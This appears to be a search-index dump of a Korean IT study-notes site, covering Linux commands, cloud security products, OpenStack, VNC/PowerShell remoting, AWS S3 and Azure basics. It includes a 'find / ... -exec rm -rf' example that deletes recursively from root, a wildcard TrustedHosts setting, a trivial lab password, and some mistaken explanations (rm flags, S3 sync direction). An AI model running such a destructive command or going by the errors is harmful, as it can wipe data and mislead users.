파일 or 디렉토리 등 특정 대상  ex) netstat -anp, ifconfig -a, ls -al      Linux의 절대경로와 상대경로\n 명령어를 사용할 때 경로를 입력하는 방식은 2가지가 있다. 절대 경로 : 최상위 디렉토리인 /에서부터 특정 파일 또는 디렉토리의 경로를 모두 입력 상대 경로 : 현재 작업 디렉토리를 기준으로 특정 파일 또는 디렉토리의 경로를 입력  /\r최상위 디렉토리\r./\r현재위치\r../\r전 위치 \u0026quot;-\u0026quot; 와 동일\r  Linux 명령어   환경변수  HOME : 사용자의 홈 디렉토리 PATH : 실행파일을 찾는 경로 LANG : 프로그램 사용시 기본으로 지원되는 언어 SHELL : 로그인해서 사용하는 쉘 EDITOR : 기본 편집기의 이름 PSI : 명령 프롬프트 변수   Linux 기본 명령어 pwd 현재 디렉토리 확인 cd [ 이동할 경로 ] 작업 디렉토리 변경 ls [ 확인 할 디렉토리 ] 디렉토리 내용 확인 ls -al 숨겨진 파일까지 모두 표시 -l은 보다 자세한 결과 검은색은 실행파일, 파란색을 디렉토리 파일을 의미 mkdir [ 생성할 디렉토리 이름 ] 지정한 이름으로 된 디렉토리 생성 ( 하위 구조도 함께 생성 : -p ) rmdir [ 삭제할 디렉토리 이름 ] 디렉토리 삭제 rm -rf [ 삭제할 디렉토리, 파일 이름] r은 디렉토리 f는 파일을 의미 mv [ 원본 경로 ] [ 이동할 경로 ] 디렉토리 혹은 파일을 이동 및 이름 변경 cp -r [ 원본 경로 ] [ 이동할 경로 ] r은 디렉토리를 포함해서 복사할 때 필요 touch [ 파일 이름 ] 내용이 아무것도 없는 빈 파일 생성 cat [ 파일 ] 파일의 내용을 전부 확인 head [ 파일 ] 파일의 내용을 시작부터 몇 줄만 확인 기본 10줄 tail [ 파일 ] 파일의 내용을 끝에서 몇 줄만 확인 기본 10줄 more [ 파일 ] 파일의 내용을 화면에 맞춰서 확인   grep grep [ 옵션 ] [ 패턴 ] [ 파일 이름 ]  \rGrep 폼 설명\r...\r\r 옵션   i : 대소문자 무시\n  n : 줄 번호 표시\n  v : 패턴을 제외한 내용만 출력\n  w : 단어 단위로 검색\n  c : 매칭되는 줄 수 표시\n  l : 매칭되는 패턴이 있는 파일 이름 출력\n      패턴   정규표현식 : 어떤 문자를 표현할 때 다양한 특수문자를 이용해 표현하는 방식\n  ^ : 줄의 시작을 지정 ( 해당 패턴이 줄의 시작인 경우 캡쳐 )\n ex) ^root    $줄의 마지막을 지정\n ex) root$    . : 한 문자 대치\n ex) r..t    \u0026ldquo;*\u0026rdquo; : 여러 문자 대치\n ex) r*    [ ] : 패턴 중 한 문자 일치\n ex) [ r ]oot    [^] : 패턴 중 제외할 문자 지정\n ex) [^ T]oor T를 제외한 oot 부분 출력        \r\r\r    fgrep fgrep [ 옵션 ] [ 패턴 ] [ 파일 이름 ]  grep에서 특수문자가 포함된 경우 사용     find find [ 경로 ] [ 조건 ] [ 아규먼트 ] [ 행동 ] ex) find / -name file -exec rm -rf {} \\;  \rfind 폼 설명\r...\r\r 경로 : 어디를 기준으로 검색 할 것인지를 입력    조건 : 어떤 조건으로 검색할 것인지를 입력   name : 이름으로 검색\n  type : 파일의 타입으로 검색 ( d : 디렉토리 | f : 파일 )\n  perm : 권한으로 검색\n  user : 소유자로 검색\n  size : 파일 크기로 검색 +는 이상, -는 이하, 단위는 512바이트 C 바이트, k키로 바이트, M 메가바이트, G 기가바이트\n  atime : 파일의 마지막 접근 시간으로 검색\n  mtime : 파일의 마지막 수정 시간으로 검색\n       아규먼트 : 조건에 맞는 값을 입력\n  행동 : 검색 결과를 어떻게 처리할 것인지를 입력\n  ls : 자세한 결과 출력\n  exec [ 명령어 ] {} ; 검색할 파일을 특정 명령어로 실행\n ex) -exec rm -rf {} ;      \r\r\r  하드 추가  fdisk -l # 현재 장착된 하드디스크 목록 dfisk /dev/sd[n] # 새로 장착한 하드디스크의 파티션 설정 및 포맷 # 새로운 파티션 만들기 n # 확장 e, 새로운 파티션 p # 상세설명 읽기 # w 내용저장 mkfs -t [ 포맷 방식 ] /dev/[ 생성된 sd ] # 포맷 mount /dev/[ 생성된 sd ] [ 마운트 할 폴더 ] mount # 마운트 진행 df -h # 전체 다이렉트 구조 출력   하드링크와 심볼링 링크  ln [ 옵션 ] [ 원본 ] [ 링크 ] # 하드 링크 ln -s [ 옵션 ] [ 원본 ] [ 링크 ] # 심볼릭 링크  \r하드 링크와 심볼릭 링크\r...\r\r Link   특정 파일 또는 디렉토리에 접근을 쉽게 할 수 있도록 하는 방법 파일 시스템이 물리적인 장치인 하드 디스크 상에 저장되어 특정 파일의 위치를 가리키는 것 하드링크는 실질적인 디스크 상의 파일을 가르키며, 심볼릭링크는 파일 시스템 상의 특정 파일을 나타냄  \r\r\r   권한  chomod [ 권한 ] [ 파일 또는 디렉토리 ]  \r권한\r...\r\r권한   리눅스의 파일을 사용할 수 있는 권한 기본적으로 022 ( 기본권한 : 읽기만가능 ) 권한은 8진수 혹은 심볼릭 모드로 입력이 가능  심볼릭  옥텟 ( 8진수 ) 모드 \r\r\r   프로세스  ps [ 옵션 ] pstree pgrep  \r프로세스\r...\r\r프로세스  윈도우 관리자와 비슷한 명령어   시그널 번호 \r\r\r   압축\u0026amp; 아키이브  tar [ 기능 ] [ 아카이브 파일 ] [ 묶음 파일 1 ] [ 묶음 파일 2 ]... zip [ 압축 파일 이름 ] [ 압축할 파일 이름 ] unzip [ 압축 파일 이름 ] gzip [ 압축 파일 이름 ] gunzip [ 압축 파일 이름 ] bzip2 [ 압축 파일 이름 ] bunzip2 [ 압축 파일 이름 ]  \r아카이브\r...\r\r아카이브  여러 파일을 하나의 묶음으로 보관하는 것 아카이브는 용량이 줄지 않음 기능 -c : 새로운 아카이브 파일 생성 -x : 아카이브 파일에서 여러 파일을 해제 -t : 아카이브 파일에서 안의 내용을 조회 -v : verbose, 명령어 수행과정을 자세히 출력 -f : 아카이브 장치 지정 ( 파일 또는 백업 장치를 지정 )  \r\r\r   사용자관리  useradd [ 옵션 ] [ 아규먼트 ] [ 사용자이름 ] # 유저 생성 usermode [ 옵션 ] [ 아규먼트 ] [ 사용자이름 ] # 유저 변경 userdel -r [ 유저이름 ] # 유저 삭제 passwd [ 사용자명 ] # 사용자의 패스워드 변경 groupadd | groupmod | groupdel  \r사용자관리\r...\r\r사용자관리   /etc/passwd : 사용자의 기본 정보를 저장하고 있는 파일     /etc/shadow : 사용자의 패스워드를 저장하고 있는 파일     /etc/group : 그룹에 대한 정보를 저장하고 있는 파일     useradd     usermode     passwd     패스워드 정책 설정 파일 /etc/security/pwquality.conf /etc/login.defs  \r\r\r   RAID  mdadm --create /dev/md/linear --level linear --raid-devices=2 /dev/sdb1 /dev/sdc1 # RAID 0 구성 : Linear mdadm --create /dev/md/mirror --level mirror --raid-devices=2 /dev/sdb1 /dev/sdc1 # RAID 1 구성 : Stripte mdadm --create /dev/md/raid5 --level=5 --raid-devices=3 /dev/sdb1 /dev/sdc1 /dev/sdd1 # RAID 5 구성 : 5 mdadm --stop [ RAID 장치명 ] # RAID 구성 삭제 mdadm --zero-superblock [ 파티션 장치명 ] # RAID 파티션 구성 삭제  \rRAID\r...\r\rRAID   mdadm 명령어  \u0026ndash;create : 생성할 RAID 장치의 이름 \u0026ndash;level : RAID 레벨을 지정 \u0026ndash;raid-devices : RAID에 추가될 실제 장치의 파티션 지정 \u0026ndash;detail : 특정 장치의 상세 내력을 출력    \r\r\r   LVM  # 모든 LVM은 fdisk를 이용한 파티션 설정 후 pvcreate [ /dev/sdb1 ] # PV 생성 pvscan # PV 확인 vgcreate [ /dev/sdb1 /dev/sdb2 ] # VG 생성 vgscan vgdisplay # 확인, 자세히 확인 lvcreate [ -n test ] [ -L 15GB ] [ 빌려갈 vg 이름 ] # lvscan 확인 lvextend -L + 5GB /dev/vg/test # 용량 증설 Linear: lvcreate --type raid00 -L [ 크기 ] [ VG 이름 ] Stripe: lvcreate --type raid0 --stripes [ 디스크 수 ] --stripesize [ 크기 ] [ VG } # RAID 0 구성 mirror: lvcreate --type mirror [ 미러 수 ] VG # RAID 1 구성 ( 미러는 복사되는 장치의 수 ) lvcreate --type raid5 --stripes [ 디스크 수 ] --stripesize [ 크기 ] VG # RAID 5 구성  \rLVM\r...\r\rLVM ( Logical Volume Manager )   논리 볼륨을 효율적이고 유연하게 관리하기 위한 커널의 한 부분이자 프로그램 기존 방식에서는 파일 시스템이 블록 장치에 직접 접근해서 읽고/ 쓰기를 했다. LVM을 사용하면 파일 시스템이 LVM이 만든 가상의 블록장치에 읽고/ 쓰기를 구행하며, 이를 통하여 다양한 기능 제공   LVM의 구조  PE : 파티션 개념 ( 초기화 필요 ) PV : PE를 묶어 둔 것 VG : PV가 모여 된 것으로, 필요한 만큼 빌려서 사용 가능    LE : LV를 이루는 가장 작은 단위로 PE와 동일한 개념을 가짐 LV : VG와 동일한 개념을 가짐    마운트 이후 사용  \r\r\r   작업 스케줄링  at [ 시간 ] at -l # 작업 조회 at -r [ 작업 번호 ] # 작업 삭제 crontab -e # 작업 예약 crontab -l # 작업 조회 crontab -r # 작업 삭제  \r작업 스케줄링\r...\r\r작업 스케줄링   crontab -e : 반복 작업 스케쥴링 명령어   \r\r\r   백업 및 복구  tar zcvpf [ 아카이브 이름 ] --exclude = [ 예외 ]/ # 예외를 제외하고 전체를 백업 tar zcvpf [ 아카이브 이름 ] -g [ 리스트 파일 이름 ] [ 경로 ] # -g 옵션을 이용하면 리스트를 만들어 백업 정보를 따로 저장 ( -p는 기존의 파일 시스템의 권한 정보를 그대로 유지 ) tar zxvpf [ 아카이브 이름 ] -C [ 복구할 경로 ] -g [ 리스트 파일 이름 ] # C 옵션을 이용해서 아카이브 및 압축을 해제하면 특정 경로를 지정해 해당 경로에 풀 수 있다. dump [ 옵션 ]f [ 백업 장치 ] [ 백업 대상 ] # 0~ 9: 증분 or 차분 백업, 0은 전체백업을 의미 restore -rvf [ 백업 파일 or 장치 ] # 복구 명령어를 실행하면 작업 디렉토리에 restoresymtable 파일 생성 dd = [ 백업할 장치 ] of = [ 저장할 위치 ] [ bs = [ 크기 ]] count = [ 숫자 ] # dd를 이용한 백업 dd if = [ 백업할 장치 ] of = [ 저장할 위치 ] [ bs = [ 크기 ] ] count = [ 숫자 ] # dd를 이용한 복구  \r백업 및 복구\r...\r\r백업 및 복구   언제 발생할 지 모르는 사고를 대비해 반드시 해야하는 것  \r\r\r   소프트웨어 패키지 rpm, 소스 코드, yum  rpm -lvh [ 패키지 ] # rpm을 통한 설치 ./configure make make install # 소스 코드를 이용한 관리 yum install [ 패키지명 ] # yum을 통한 설치  \rrpm\r...\r\rrpm ( Redhat Package Manager )   rpm     소스 코드  ./configure: 컴퓨터 환경 설정 파일 make: makefile의 내용대로 컴파일 하는 파일 make install: 컴파일 된 파일을 설치하는      yum  yum : 레포지터리에서 다운 및 설치하는 명령어 yum install [ 패키지명 ] ( *: 관련 패키지 모두 설치 ) 의존성 있는 파일을 모두 설치해준다 yum erase [ 패키지명 ]: 해당 패키지 삭제 yum upgrade [ 패키지명 ]: 해당 패키지 업그레이드    \r\r\r   Log  /etc/rsyslog.conf [ Facility ].[ Level ] [ Action ]  \rLog\r...\r\rLog   컴퓨터 또는 프로그램의 사용 기록  로그의 종류  Facility  kern: 커널이 발생한 메시지 user: 사용자 프로세스 mail: mail 시스템 관련 서비스 damon: telnetd, ftpd, httpd와 관련된 서비스 auth: 로그인과 같은 인증 관련 서비스 syslog: syslog 관련 서비스 cron: 예약작업 관련 서비스, crond, atd *: 모든 서비스를 의미   Level  emerge: 일반적으로 모든 사용자에게 전달되는 패닉 상황 ( 블루스크린, 커널 패닉 ) alert: 시스템 DB에 손상 등 즉시 수정해야되는 상황 crit: 하드 장치 오류 등 중대한 상황에 대한 경고 err: 하등 장치 이외의 오류 warning: 경고 메시지, 무시해도 됨 notice: 특별한 처리가 필요할 수 있는 비오류 상황 info: 정보 메시지 debug: 프로그램 개발 또는 테스트 할 때 사용 none: 로그로 기록  \r\r\r   메모리  free # 메모리 공간을 확인 할 때 사용 top # 프로세스 정보와 CPU 정보를 할께 살펴볼 수 있는 명령어 SWAP # 메모리의 여유 공간을 디스크에 확보하는 명령어  \r메모리\r...\r\r메모리   커널이 관리하는 장소 프로세스를 언제, 어디서 어떻게 적재할 것인지를 커널이 관리 리눅스는 하나의 프로세스에 4GB의 가상 메모리 주소 공간을 할당  \r\r\r   ****   \rExpand\r...\r\r****  \r\r\r   ****   \rExpand\r...\r\r****  \r\r\r "}),a.add({id:149,href:'/docs/network/mail/',title:"Mail",content:"Mail    Mail docs\n Mail Server 구축      "}),a.add({id:150,href:'/docs/ncp/ncptraining/nca10/',title:"Naver Cloud Security Services",content:"Cloud ecurity Services   Site Safer / App Safer   Site Safer   고객의 웹 페이지에 악성 코드가 있는 지 주기적으로 검색\n  NCP 외부 IP대역도 점검 가능\n  행위 기반 탐지\n      App Safer   고객의 APP실행 모바일 환경에 대한 보안 위협 여부를 실시간으로 탐지\n  치팅 프로그램, 핵 등으로 APP 무결성 검사\n       File Safer   업로드 / 다운로드 되는 파일의 악성코드 여부를 탐지   고객의 웹 페이지에 업. 다운로드 되느 파일에 대한 체크\n  악성코드 여부를 신속하고 정확하게 탐지\n       Web Security Checker   고객의 웹 사이트 보안 취약점 진단   고객의 웹 페이지에 취약점이 없는지 체크\n  현재 18가지 주요 웹 취약점에 대해 점검가능 ( 원하는 항목만 선택가능 )\n  취약점에 대한 진단 뿐만 아니라 대응반안도 함께 제공\n       System Security Checker   고객의 시스템 보안 취약점 진단   고객의 OS, WAS, 설정에 대한 취약점 점검\n  점검 필요 서버에 Agent 설치 후 간편하게 사용 가능\n  KISA 봉나 설정 가이드와 NAVER 보안 설정 저액에 근거하여 취약점 점검 및 수정 가이드 제공\n       Certficate Manager   SSL 인증서 등록 및 관리의 통합   네이버 클라우드 플랫폼 연계상품 ( LB, CDN+, Image Optimizer)에서 사용할 인증서를 등록할 수 있으며, 등록 시 인증서 유효성을 체크\n  인증서의 만료 예정일 한달 전부터 정기적으로 알람 메일과 SMS를 발송\n       Security Monitoring   Naver Cloud의 향상된 보안 부가 상품      구분 서비스명 서비스 설명     Basic IDS 이벤트 탐지 보안사고 의심 이벤트 발생이 탐지 및 분석 보고서 전달   `` Anti - Virus 윈도우 OS에 한해 오피스 스캔 백신 지원   Managed IDS 이벤트 탐지 BASIC 서비스 내용을 기본적으로 포함   `` DDos 이벤트 탐지 고객별 특화된 탐지 정책 허용   `` IPS 이벤트 탐지 고객별 특화된 탐지/ 차단 정책 허용   `` 침해 사고 기술 지원 고객 요청 시 침해 서버 분석 서비스 제공   `` WAF 고객별 특화된 탐지 정책 허용   `` Anti-Virus BASIC 서비스 내용 기본적으로 포함 / LINUX OS에 설치 가능한 백신 또한 제공       SSL VPN   SSL VPN을 통한 서버 접속   10대역의 28bit VPN IP대역 제공\n  SSH, RDP와 같은 포트는 외부에서 접근할 수 없도록 ACG에서 차단\n  ACG에 VPN IP 대역에 대해서 접근 가능하도록 설정하여 서버를 안전하게 관리가능\n      최대 10개 ID 생성 가능 및 전용 VPN 프로그램 설치하여 VPN 사용   3개, 5개, 10개 ID 생성 가능\n  사용자 가이드를 통해 프로그램 다운로드 가능\n      1차 인증과 2차 인증 지원   ID/PW로 로그인 가능한 1차 인증\n  ID / PW 뿐만 아니라 SMS / Mail의 OTP를 입력해야 하는 2차 인증\n      "}),a.add({id:151,href:'/docs/openstack/openstack/',title:"OpenStack docs",content:" OpenStack   OpenStack의 개요\n  Keyston : 인증을 관리하는 서비스\n  Glance : 이미지를 관리하는 서비스\n  Nova : 가상의 서버를 생성하는 서비스\n  Neutron : 네트워크를 관리하는 서비스\n  Cinder : 블록 스토리지 서비스\n  Ceilometer : 리소스의 사용량과 부하를 관리하는 서비스\n  Horizon : 외부 인터페이스 대시보드 서비스\n  Swift : 오브젝트 스토리지 관리 서비스\n  Heat : 오케트스트레션 서비스\n  Trove : 데이터베이스 서비스\n  Sahara : 데이터 프로세싱 서비스\n  Ironic : 베어메탈 서비스\n        OpenStack Training  OpenStack Ussuri   OpenStack Ussuri : Overview\n  OpenStack Ussuri : 환경설정\n  OpenStack Ussuri : Keystone\n  OpenStack Ussuri : Glance\n  OpenStack Ussuri : Nova\n  OpenStack Ussuri : Neutron\n  OpenStack Ussuri : Cinder\n  OpenStack Ussuri : Horizon\n  OpenStack Ussuri : Swift\n  OpenStack Ussuri : Heat\n  OpenStack Ussuri : Gnocch\n  OpenStack Ussuri : Trove\n  OpenStack Ussuri : Designate\n  OpenStack Ussuri : Brabican\n  OpenStack Ussuri : Rally\n  OpenStack Ussuri : Manila\n        OpenStack Stain    DevStack    PackStack     "}),a.add({id:152,href:'/docs/docker/',title:"operation",content:""}),a.add({id:153,href:'/docs/database/sqld/sqld-0/',title:"SQL 개요",content:"****  ****       "}),a.add({id:154,href:'/docs/database/sqld/',title:"SQLP\u0026 SQLD",content:"SQLP\u0026amp; SQLD      SQL 개요     SQLP   \n  \n       SQLD   SQLD : 데이터 모델링\n  SQLD : SQL 기본\n      "}),a.add({id:155,href:'/docs/system/window/window10/',title:"VNC Server",content:"VNC Server   VNC Server    원격지에서 Windows 환경 자체를 사용할 수 있도록 제공하는 서버\n  Windows Server는 VNC 서버를 제공하지 않습니다.\n  오픈소스로 제공되므로별도의 추가 비용 없이 자유롭게 사용가능하지만, 텍스트만 전송되는 Telnet에 비해 속도가 느린 단점을 가지고 있습니다.\n         FIRST 서버에서 VNC를 설치합니다.\n  기본 값으로 설정 후, 설치를 진행합니다.\n        패스워드 입력시 12345를 입력합니다.\n  실무에서 사용시에는 복잡한 암호를 사용해야합니다.\n       다른 서버들과 동일하게 서비스와 방화벽이 허용되었는 지를 확인해야합니다.        접속확인을 위해 WINCLIENT에서 VNC설치를 진행합니다.\n  단, 커스텀 설치를 선택하여 뷰어만을 선택하여 설치합니다.\n        패스워드는 동일하게 12345로 설정하였습니다.       설치가 완료되면 접속확인을 위해 TightVNC Viewer을 실행하여 FIRST의 IP 및 설정한 패스워드를 입력하여 접속합니다.         접속을 확인하실 수 있습니다.      PowerShell 원격접속   Windows Server 2016을 Sever Core 모드로 설치해 놓았다면 파워 셸에 원격으로 접속하는 것이 좋으며, 보안상에도 뛰어난 특징을 가지고 있습니다.       먼저 SERVICECORE의 접속하여 POWERSHELL로 접속합니다.\n  접속 후 Enable-PSRemoting -Force를 입력하여 원격접속을 허용시킵니다.\n  Set-Item WSMan:\\localhost\\Client\\TrustedHosts -Valute * -Force를 입력하여 접속가능 호스트를 전부로 지정합니다.\n        접속확인을 위해 WINCLIENT로 접속하여 set-item WSMan:\\localhost\\Client\\Trustedhosts -Value 192.168.10.50 -Force를 입력하여 접속을 설정합니다.\n  이제 접속을 위해 Enter-PSSession -ComputerName 192.168.10.50 -Credential administrator을 입력해 로그인하면 접속을 확일하실 수 있습니다.\n       원격 접속 서버 장단점 비교       TELNET SSH VNC 원격 데스크톱 PowerShell     속도 매우 빠름 매우 빠름 매우 느림 빠름 매우 빠름   그래픽 X X O O X   보안 X O SSH로 보완가능 O O   명령어 텍스트 텍스트 제한 없음 제한 없음 모든 PowerShell 명령어   클라이언트 프로그램 내장 별도 설치 별도 설치 기본 내장 기본 내장   라이센스 유료 또는 무료 유료 또는 무료 무료 추가비용 X 추가비용 X    "}),a.add({id:156,href:'/docs/aws/awstraining/s3/',title:"AWS S3 생성",content:"AWS S3 생성    이번 장에서는 S3를 생성해보도록 하겠습니다. S3 또한 중요한 개념이니, S3에 대한 학습을 원하는 분들은 AWS S3를 참조해주세요.    AWS S3 생성       AWS 서비스에서 S3를 검색합니다.      버킷 생성을 클릭합니다.      버킷의 이름과 리전을 선택합니다. 참고로 S3는 VPC에 영향을 받지 않습니다.      옵션을 선택합니다. 여기서는 기본 값으로 생성을 진행합니다.      S3에 대한 권한을 설정합니다. 기본적으로 차단되어 있는 것이 좋으며, 경우에 따라 설정 값을 변경합니다.      생성이 완료되면 버킷을 클릭합니다.      버킷을 클릭한 후, IMG 폴더를 생성합니다.      IMG 폴더로 진입하여 jpg 이미지 파일을 업로드 합니다.      이미지 파일을 선택하면 다운로드 링크, URL 링크를 확인할 수 있습니다. 여기에서는 URL 링크로 진입하여 보겠습니다.      링크로 진입하여도, 그림이 나타나지 않습니다. 이는 초기 버킷을 생성할 때, 퍼블릭 엑세스를 차단하였기 때문입니다.      이에 대한 수정을 위해 버킷에서 퍼블렉 엑세스 설정을 편집을 클릭합니다.      퍼블릭 엑세스 차단을 해제 후 저장합니다.      다시 파일을 선택하여 퍼블릭 설정을 클릭합니다.      URL로 접속하면 이미지가 나타납니다.         CLI S3 생성      $ aws s3 help $ aws s3api help  s3에 대한 명령어를 출력합니다.     $ aws s3 mb s3://[ 버킷 이름 ]  버킷을 생성합니다.     $ aws s3 ls $ aws s3 ls s3://[ 버킷 이름 ]/path  버킷 및 폴더를 나열합니다.     $ aws s3 rb s3://[ 버킷 이름 ] $ aws s3 rb s3://[ 버킷 이름 ] --force  버킷을 삭제합니다.     $ aws s3 cp file.txt s3://my-bucket/ --grants [ 권한 ]         $ aws s3 sync [ local path ] s3://[ bucket path ]/[ path ]  [ local path ]에서 [ bucket ]의 [ path ]에 모든 것을 Pull ( 다운로드 ) 합니다.     $ aws s3 sync s3://[ bucket path ]/[ path ] [ local path ]  [ local path ]에서 [ bucket ]의 [ path ]에 모든 것을 Push ( 업로드 ) 합니다.     "}),a.add({id:157,href:'/docs/azure/azuretraining/azure01/',title:"Az-900 : Region",content:"Azure 글로벌 인프라 아키텍처   Microsoft Geography     Azure는 전 세계를 지정학적 경계 또는 국가 경계로 정의되는 지리적 위치로 분할합니다.\n  Azure Geography란 일반적으로 데이터 상주성 및 규정 준수 경계를 유지하는 두 개 이상의 Azure 지역을 포함하고 있는 별도의 시장을 의미합니다.\n  Azure Geography을 사용하면 아래와 같은 이점을 가질 수 있습니다.\n  지리적 위치를 통해 특정 데이터 상주성 및 규정 준수 요구 사항이 있는 고객은 데이터와 애플리케이션을 가깝게 유지할 수 있습니다.\n  지리적 위치는 지리적 경계 내에서 데이터 상주성, 주권, 규정 준수 및 복원력 요구 사항이 지켜지도록 보장합니다.\n  지리적 위치는 전용 대용량 네트워킹 인프라 전체에 걸쳐 발생하는 Azure 지역 전체 장애를 견디는 내결함성을 갖고 있습니다.\n    Azure의 Geography는 아래와 같이 4개로 분류됩니다.\n  아메리카\n  유럽\n  아시아 태평양\n  중동 및 아프리카\n       Azure Region     Azure Region은 서로 가까운 곳에 있고 대기 시간이 짧은 네트워크를 통해 연결된 데이터 센터를 하나 이상 포함하고 있는 지리적 영역을 의미합니다.\n  Azure는 전 셰계에 위차한 데이터 센터로 구성\n  최소 한 개 이상의 데이터 센터를 포함\n  데이터 센터는 서로 근접한 위치에 있어 네트워크의 대기 시간이 짧은 특징을 가짐\n  Region은 각 지역에 맞는 Geography에 구성됩니다.\n     Region Pairs     각 Azure 지역은 300마일 이상 떨어져 있는 동일한 지리적 위치(예: 미국, 유럽 또는 아시아) 내의 다른 Azure 지역과 항상 쌍을 이룹니다.\n  Region Pairs를 통해 한 지리적 위치에서 가상 머신 스토리지 같은 리소스를 복제할 수 있으며, 이렇게 하면 두 Azure 지역에 동시에 영향을 주는 자연재해, 내전, 정전 또는 물리적 네트워크 중단 등의 이벤트 때문에 서비스가 중단될 가능성을 줄일 수 있습니다.\n  각 Azure region은 다른 region과 페어링 연결되어 있습니다.\n  특정 서비스는 paired region 사이의 자동 복제기능을 제공\n  region 장애 시, paired 된 리전을 복제하는 것이 우선시 되어짐\n     특수 Azure Region   US DoD 중부, US Gov 버지니아, US Gov 아이오와 등 : 미국 정부 기관 및 파트너를 위한 물리적 및 논리적 네트워크로 격리된 Azure 인스턴스입니다. 이러한 데이터 센터는 선별된 미국인이 운영하며 추가 규정 준수 인증서를 포함하고 있습니다.\n  중국 동부, 중국 북부 등 : 이러한 지역은 Microsoft 및 21Vianet 간의 고유한 파트너십을 통해 사용할 수 있으며, Microsoft에서 데이터 센터를 직접 관리하지 않습니다.\n       Region을 사용하는 이유   보다 쉽게 확장이 가능하게 하는 확장성\n  한 리전에 문제가 발생시 다른 리전에서 서비스가 가능토록 하는 가용성\n  한국 중부, 한국 남부는 짝꿍 리전으로 한 리전이 오류가 발생 시 다른 리전에서 대신 서비스하도록 설정되어 있음\n       가용성 옵션 ( Availability Options )     가용성 영역은 Azure 지역 내에서 물리적으로 분리된 데이터 센터입니다.\n  Vm을 나눠서 생성함으로써, 끊어지지 않는 연속적인 서비스가 가능토록 하는 개념\n  프로미엄 스토리지를 사용하면 99.9%의 연결성을 보장해주지만, 일반적인 경우에는 가용성 집합 혹은 가용성 영역을 생성하는 것이 권장되어짐\n  가용성 집합 (Availability sets)   유지 관리 혹은 하드웨어 오류 발생 시에도 응용 프로그램을 온라인 상태로 유지하는 서비스\n  Update domains (US) : 예약된 유지관리, 성능 또는 보안 업데이트는 업데이트 도메인을 통해 순서가 정해짐\n  Fault domains (FD) : 데이터 센터 내에서 여러 하드웨어서 워크로드르 물리적으로 분\n       가용성 영역 ( Availability zones )   Azure Region 내에서의 물리적으로 분리된 영역\n  가용성 영역보다 한 단게 확장된 개념\n  하나 혹은 이상의 데이터센터로 구성되고 독립된 전원, 쿨링, 네트워크를 가짐\n  독립된 영역으로 동작\n         Azure SLA (서비스 수준 계약)    Microsoft는 포괄적인 운영 정책, 표준 및 관례를 준수함으로써 고객에게 우수한 품질의 제품 및 서비스를 제공하기 위해 최선을 다하고 있습니다.\n  Azure 제품 및 서비스의 SLA는 세 가지 주요 특징을 가지고 있습니다.\n   성능 목표\n SLA는 Azure 제품 또는 서비스의 성능 목표를 정의합니다. SLA가 정의하는 성능 목표는 각 Azure 제품 및 서비스로 한정됩니다. 예를 들어 일부 Azure 서비스의 성능 목표는 작동 시간 보증 또는 연결률로 표현됩니다.        작동 시간 및 연결 보증\n  일반적인 SLA는 해당하는 각 Azure 제품 또는 서비스의 성능 목표 약정을 99.9%(\u0026ldquo;3개의 9\u0026rdquo;)에서 99.999%(\u0026ldquo;5개의 9\u0026rdquo;) 사이에서 지정합니다. 이러한 목표는 서비스의 작동 시간 또는 응답 시간 같은 성능 기준에 적용할 수 있습니다.\n     SLA % 주간 가동 중지 시간	월간 가동 중지 시간 연간 가동 중지 시간     99 1.68시간 7.2시간 3.65일   99.9 10.1분 43.2분 8.76시간   99.95 5분 21.6분 4.38시간   99.99 1.01분 4.32분 52.56분   99.999 6초 25.9초 5.26분           서비스 크레딧   또한 SLA는 Azure 제품 또는 서비스가 관련 SLA 사양을 수행하는 데 실패할 경우 Microsoft에서 어떻게 대응할 것인지를 설명합니다.\n  99.9 -\u0026gt; 10\n  99 -\u0026gt; 25\n  95 -\u0026gt; 100\n         Azure SLA를 통한 앱 안정성 향상    SLA를 사용하여 Azure 솔루션이 클라이언트와 사용자의 비즈니스 요구 사항 및 수요를 얼마나 충족하는지 평가할 수 있습니다.\n  고유한 SLA를 만들어서 고객의 특정 Azure 애플리케이션에 맞는 성능 목표를 설정할 수 있습니다. 이 접근 방식을 애플리케이션 SLA라고 합니다.\n  SLA를 사용한 이점\n   앱 요구 사항 이해\n 효율적이고 신뢰할 수 있는 Azure 솔루션을 빌드하려면 워크로드 요구 사항을 알아야 합니다.        복원력\n 복원력은 오류를 복구하여 계속 작동하는 시스템 기능입니다. 오류를 방지하는 것이 아니라 가동 중지 또는 데이터 손실을 방지하는 방법으로 오류에 대응하는 것입니다.        비용 및 복잡성과 고가용성\n 가용성이란 시스템이 정상적으로 작동하는 시간을 말합니다. 가용성을 최대화하려면 가능한 서비스 오류를 방지하는 수단을 구현해야 합니다.        애플리케이션 SLA를 정의할 때 고려할 사항\n  플리케이션 SLA에서 정의하는 성능 목표가 4개의 9(99.99%)인 경우 수동 작업으로 오류를 복구하면 SLA를 충족하기에 충분하지 않을 수 있습니다. Azure 솔루션이 자체적으로 진단하고 자체적으로 복구해야 합니다.\n  4개의 9보다 높은 SLA 성능 목표를 충족하도록 신속하게 오류에 대응하기는 쉽지 않습니다.\n  애플리케이션 SLA 성능 목표를 측정할 시간 범위를 신중하게 고민해야 합니다. 시간 범위가 짧을수록 허용 오차도 작습니다. 애플리케이션 SLA를 시간 단위 또는 일 단위 가동 시간으로 정의하는 경우 허용 오차가 작으면 성능 목표를 달성하지 못할 수 있다는 점을 이해해야 합니다.\n        "}),a.add({id:158,href:'/docs/azure/microsoftazure/azure01/',title:"Azure Networking",content:"Azure Networking    Azure Networking은 컴퓨팅 리소스를 연결하고 애플리케이션에 대한 액세스를 제공하는 것으로 Microsoft Azure 데이터 센터의 서비스 및 기능을 외부 환경에 연결하는 다양한 옵션이 포함되어 있습니다.     Azure Virtual Network   수신 VPN(가상 사설망) 연결에 VM을 연결합니다.     Azure Load Balancer     Azure Load Balancer는 사용자를 위한 유지 관리를 Azure에서 담당하는 서비스 입니다.\n  인바운 및 아웃바운드의 시나리오에 맟춰 해당 TCP, UDP 포트로 접근하는 각 트래픽을 부하분산합니다.\n  단, 가상 머신에서 일반저인 부하 분산 장치를 소프트웨어를 수동으로 구성하는 경우 추가로 시스템을 유지 관리해야 하는 단점이 존재합니다.\n     Azure Application Gateway     Azure Applicatin Gateway는 모든 트래픽이 HTTP인 경우 URL 기반의 라우팅 규칙을 통해 부하 분산을 진행합니다.\n  AAG의 장점은 하단과 같습니다..\n  쿠키 선호도\n 동일한 백 엔드 서버에서 사용자 세션을 유지하려는 경우에 유용합니다.        SSL 지원\n SSL 인증서를 통해 암호화가 가능합니다.        웹 애플리케이션 방화벽\n WAF를 지원합니다.        URL 규칙 기반 경로\n URL 패턴, 대상 IP 주소 및 포트에 해당하는 원본 IP 